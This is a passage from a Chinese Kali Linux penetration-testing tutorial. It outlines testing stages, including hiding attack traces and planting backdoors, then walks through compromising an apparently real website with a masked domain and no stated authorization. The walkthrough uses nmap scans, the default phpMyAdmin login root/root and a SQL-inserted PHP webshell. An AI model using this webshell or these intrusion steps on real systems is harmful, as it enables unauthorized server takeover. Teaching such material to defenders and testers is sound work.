它将渗透测试分成了十个步骤，其中第6步“社会工程学”为可选步骤，但是笔者认为社会工程学在渗透测试的任何一个流程中都有用武之地，它是安全测试的一个方法，不应该成为一个单独的流程。

在本书中，我们将整个过程划分为5个步骤。

### 1.3.1 信息搜集

在练习过程中，选择目标的过程，读者自行完成。在讲解具体漏洞攻击的章节中，还会讲解一些如何快速查找特定目标的方法。本书假定读者已经准备好了测试目标才阅读和实践书中内容，所以流程的第一步为信息搜集。

在这一步中，我们尽可能的使用多种信息搜集工具，包括搜索引擎和社会工程学方法。对能收集到的信息，来者不拒。

只有建立在足够信息分析的基础上，渗透测试才能游刃有余。因为信息越多，发现漏洞的几率越大。

同时对不同应用的信息收集的侧重点也不同。比如web应用和桌面应用，对于web应用，服务器操作系统、web服务器类型、web后台语言会被首先关注；而对于桌面应用，更多的是关心应用程序本身。

### 1.3.2 发现漏洞

在搜集了足够的信息之后，首先我们要判断它会存在哪些漏洞。这可以通过搜索引擎，和通用的漏洞扫描工具来完成。通常使用搜索引擎是明智的选择，比如我们在第一步中知道对方站点的编写语言为php 5.3.*，可以在google搜索“php 5.3”漏洞。

![17190339-26ce9e46f8364eee9b3757b0de43b8d](http://drops.javaweb.org/uploads/images/1d195819f717169f6257226f2c5c093adf7b85a7.jpg)

很多专业的bug站点的信息，更值得我们驻足。这样我们就可以针对性的进行漏洞扫描。此时使用专门的漏洞扫描工具比通用工具来得更实际和高效。

### 1.3.3 攻击

基本上，你能得到的漏洞，都可以找到对应的攻击方法。Kali Linux中也提供了很多现成的工具，来帮助我们顺利的攻击目标。

这一步包含两个方面，一个是利用现有漏洞利用，一个是提权。二者有时候是一回事，比如权限漏洞。

渗透测试和以破坏为目的的黑客行为还是有区别的，测试的目的是证明漏洞的存在，而不是搞破坏。所以有时候攻击成功之后可能测试任务就结束了，当然这和测试目标是紧密相关的。

攻击还包含一个重要的内容，就是如何隐藏攻击行为或者清除攻击痕迹。让对方无法或者说很难通过反追踪技术查找到攻击者。

### 1.3.4 权限维持

权限维持阶段，是我们成功攻破一个系统后，如何继续保持对系统的控制权限的问题。

一般会创建高权限的隐藏账户，或者安装后门程序（包括木马，病毒）。

### 1.3.5 文档化

文档化不是本书的强制流程，但是笔者强烈建议我们对每次渗透测试的过程和结果进行文档化处理。这样会形成知识的积累。当然如果你是专业的渗透测试工程师或者手上有渗透测试的项目，那么标准化文档是必不可少的。

### 小结

本节所讲解的流程不是标准的渗透测试流程，是本书的教学实践简化流程，读者要区别对待。

下一节，是本章的最后一节，以一个小例子来体验Kali Linux的渗透测试，来提升大家的兴趣。

1.4 小试牛刀
--------

* * *

本节作为第一章的最后一节，给大家展示一个渗透测试的简单示例。该示例操作简单，环境真实，主要是为了给您一个整体上的感知，同时提升学习渗透测试的兴趣。渗透测试的每一步并没有记录完整的细节信息。

首先，我选择了一个测试站点，下面对该站点www.xxxxoooo.cn，下面对其进行渗透测试。

### 1.4.1 信息搜集

whois查询

因为是cn域名，直接到[http://ewhois.cnnic.net.cn](http://ewhois.cnnic.net.cn/)查询，更方便。

结果如下：

![20181443-ee3d50c208fd40d9a3e4d80a8535443](http://drops.javaweb.org/uploads/images/026b5a6812b9d5c89def68b07e29efc219119c8b.jpg)

服务指纹识别

很多个人站点，都没有自定义错误信息的习惯。在url上随便输入一个不存在的地址，看是否会返回有用的信息。

![20181450-5716bced42ee40e0b06a096c583ac2d](http://drops.javaweb.org/uploads/images/a78ef8537deed758c1bad015c62510b8fafa45bf.jpg)

通过上图，我们知道该站点的应用程序由php编写，web服务器为Apathe/2.2.22，操作系统为Ubuntu。

下面我们通过指纹识别工具，进行识别。

在终端启动nmap，输入如下命令：

```
nmap -A -T4 www.xxxxoooo.cn

```

![20181456-f6194206e0434daf9c3301c47199996](http://drops.javaweb.org/uploads/images/46cbc73ef2d3efb94bbdfca21dadd6317f6c213b.jpg)

如图，识别出来的服务和系统信息与报错信息一致。

端口扫描

在终端执行如下命令，使用nmap的tcp半开扫描方式来扫描打开的端口。

```
nmap -sS <targetiste>

```

![20181503-ae3905c582194f8d8fcc02a9b8a75b8](http://drops.javaweb.org/uploads/images/8773b5ef39e3ba3bada0fefc347ecf3220379ba5.jpg)

综合性扫描

该站点是需要登录的，所以在非登录情况下，常规扫描一般情况下意义不大。但是做一个基本的站点扫描还是必须的。当然很多工具是支持登录扫描的。

因为是web应用，一般情况下，我们是需要进行完整的web应用的漏洞扫描的。本实例忽略此步骤。

### 1.4.2 发现漏洞

对于web应用，我们通常从操作系统、服务、应用本身三个方面来挖掘漏洞。

从站点应用上分析，一般的php程序会安装phpmyadmin组件，用来管理数据库。google一下，我们就会知道phpmyadmin 默认安装在站点根目录下。测试一下当前站点是否也在默认目录下安装了phpmyadmin呢？

![20181509-e1a9ca8bf4814d5086b7283f8d0266a](http://drops.javaweb.org/uploads/images/fe0d73a35bf2c933a77da8c0253080180b100dbd.jpg)

ok，确实存在phpmyadmin。

继续google “phpmyadmin 默认用户名密码”。Googele之后，我们知道：“phpMyAdmin默认使用的是MySQL的帐户和密码”。MySql的默认账户是root，默认密码是空，但是phpmyadmin是不允许空密码的。

继续 Google“inurl: phpmyadmin”,可以看到很多关于phpmyadmin的文章。

![20181517-35921403f19048f7ae4defdf889e25a](http://drops.javaweb.org/uploads/images/9e13835387c2875b170341cfab8f986499db429c.jpg)

![20181526-1449e8a568064e3fbe9a8c251f52071](http://drops.javaweb.org/uploads/images/1132eddffb6bb7c8a353d2f7597da4310fae6b54.jpg)

这些文章略过，google“hack phpmyadmin”，看看有什么发现？

在这篇文章《Hacking PHPMyadmin (when import.php deleted)》（[https://www.facebook.com/learnadvhacking/posts/556247631077238](https://www.facebook.com/learnadvhacking/posts/556247631077238)）中，我注意到

![20181536-9ffda7ad1aaa4b34ab34ff34ede222d](http://drops.javaweb.org/uploads/images/9196921892739c7b05a48688a95be5fa87e51c6b.jpg)

很多站点都配置默认密码为root。是不是也可以尝试下呢？

输入用户名root，密码root，奇迹就这么出现了，直接登录管理后台。![20181543-656f44b72bc44514a5eedbcbddccf45](http://drops.javaweb.org/uploads/images/c2ac4a326206d3effa74deaa011ecaa6e3ab3e70.jpg)

进入后台之后，我们得到了更为详尽的信息，为我们下一步攻击打下了基础

### 1.4.3 攻击与权限维持

上面的步骤，我们完成了对网站数据库的攻击，其实拿到了网站数据库，就是拿到了整个网站的控制权。

如何利用phpmyadmin进行提权，从而得到服务器的控制权呢？

目前在phpmyadmin后台，我们可以操作表，向表中写数据，如果数据库有权限dump数据到web站点所在的文件夹，那么可以先将一个网马写到数据库再保存到磁盘本地，再从浏览器访问网马，是不是就可以了呢？

首先在phpmyadmin后台找到一个数据库，在“SQL”选项卡执行sql语句创建一个表“hacker”。

![20181626-57c55b846c11467fa5b8fd1425eee41](http://drops.javaweb.org/uploads/images/8c29b718a3f409bf1d3f04735e389b350f2c6124.jpg)

语句执行成功后，再插入一条数据，代码很简单，希望能用php的system函数执行系统指令。

```
INSERT INTO hacker (packet)

VALUES(
'<pre><body bgcolor=silver><? @system($_GET["cmd"]); ?></body></pre>'  
); 

```

![20181634-8b3a0db49bbc4586b46feea26b00726](http://drops.javaweb.org/uploads/images/d6ddaf4ebc89b026a275f2cb28b81aab20174ec7.jpg)

下一步就是保存插入的记录到站点目录下，但是站点的物理路径是什么呢？我在观察页面请求链接的时候，发现一个404链接。

![20181642-107d3b9ff1c34775a295404118ffb92](http://drops.javaweb.org/uploads/images/40f59800694cca6362cb36c3039eb94855399cc9.jpg)

404链接的路径是[http://www.xxxxx.cn/var/www/productions/22_production.zip](http://www.xxxxx.cn/var/www/productions/22_production.zip)。这个是进行网站开发时候常犯的静态链接的错误，那是不是说网站的根目录在”/var/www”下呢，我把去掉”/var/www”，文件可以被正常访问。其实这也是ubuntu默认的站点目录。接下来就试试有没有权限保存文件了。

经过一番查找，终于找到一个有写权限的目录，将网马写到web目录中，得到了webshell，接下来就不用详解了吧。

### 小结

这个简单的小例子，只是想告诉大家，渗透测试有什么并没有那么困难。也没有哪种方法，哪个工具或者平台是万能的，最重要的是你自己的努力和思考。

从下一节开始，我们正式进入渗透测试的学习之旅。